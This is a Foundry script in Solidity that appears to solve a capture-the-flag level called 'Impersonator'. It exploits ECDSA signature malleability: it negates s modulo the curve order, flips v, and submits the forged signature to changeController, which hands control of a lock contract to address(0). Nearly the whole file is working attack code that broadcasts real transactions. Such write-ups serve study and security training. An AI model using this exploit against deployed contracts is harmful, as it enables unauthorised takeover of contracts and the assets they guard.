// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import "forge-std/console2.sol";

interface IImpersonator {
    function lockCounter() external view returns (uint256);
    function lockers(uint256 index) external view returns (address);
}

interface IECLocker {
    function lockId() external view returns (uint256);
    function msgHash() external view returns (bytes32);
    function controller() external view returns (address);

    function changeController(uint8 v, bytes32 r, bytes32 s, address newController) external;
}

contract L32_ECLockerScript is Script {
    address factory = 0xA280349e2256D069C43b36E4992A9879D9e7C1A1;

    function run() external {
        uint256 alice_key = vm.envUint("alice_key");
        vm.startBroadcast(alice_key);

        IImpersonator impersonator = IImpersonator(factory);

        address target = impersonator.lockers(0);
        IECLocker locker = IECLocker(target);
    
        console2.log("[Impersonator]");
        console2.log("    lockCounter = ", impersonator.lockCounter());
        console2.log("    lockers = ", target);

        console2.log("[IECLocker]");
        console2.log("    lockId = ", locker.lockId());
        console2.log("    msgHash = ");
        console2.logBytes32(locker.msgHash());
        console2.log("    controller = ", locker.controller());

        uint256 n = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

        bytes32 r = 0x1932CB842D3E27F54F79F7BE0289437381BA2410FDEFBAE36850BEE9C41E3B91;

        bytes32 s = 0x78489C64A0DB16C40EF986BECCC8F069AD5041E5B992D76FE76BBA057D9ABFF2;

        uint8 v = 27;

        bytes32 newS = bytes32(n - uint256(s));
        uint8 newV = v == 27 ? 28 : 27;

        locker.changeController(newV, r, newS, address(0));

        console2.log("[IECLocker]");
        console2.log("    controller = ", locker.controller());


        vm.stopBroadcast();
    }
}
